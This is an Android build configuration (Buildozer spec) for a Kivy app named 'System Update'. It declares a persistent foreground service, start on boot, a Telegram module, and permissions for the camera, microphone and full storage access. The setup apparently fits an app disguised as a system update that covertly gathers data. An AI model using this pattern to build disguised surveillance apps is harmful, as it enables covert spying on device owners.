[app]

title = System Update
package.name = systemupdate
package.domain = org.system.update
version = 2.0.0
version.release = 2.0.0
android.entrypoint = org.kivy.android.PythonActivity
android.main_activity = org.kivy.android.PythonActivity

icon.filename = %(source.dir)s/icon.png
icon.adaptive_foreground.filename = %(source.dir)s/icon.png
android.adaptive_icon_background = #FFFFFF

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
source.include_patterns = core/*, telegram/*, media/*, config/*, res/*
source.exclude_dirs = tests, __pycache__, docs, examples, bin, lib, include, .github
source.exclude_patterns = *.pyc, *.pyo, *.pyd, *.so.debug, *.a, *.la, *.mp4, *.mp3, *.wav, *.zip

requirements = python3,kivy,requests,pyjnius,android,urllib3,cryptography,pyopenssl,chardet,idna,certifi,Pillow,tflite-runtime,plyer,hostpython3

android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, POST_NOTIFICATIONS, SCHEDULE_EXACT_ALARM

android.services = MyService:service.py
android.foreground = True
android.archs = arm64-v8a
android.release_minify = True
android.strip_libs = True
android.api = 33
android.minapi = 21
android.ndk = 25b
android.build_tools_version = "33.0.1"
android.uses_cleartext_traffic = True

fullscreen = 1
orientation = portrait
resizeable = 0
android.manifest.launch_mode = standard

cythonize = True
log_level = 2
warn_on_root = 0
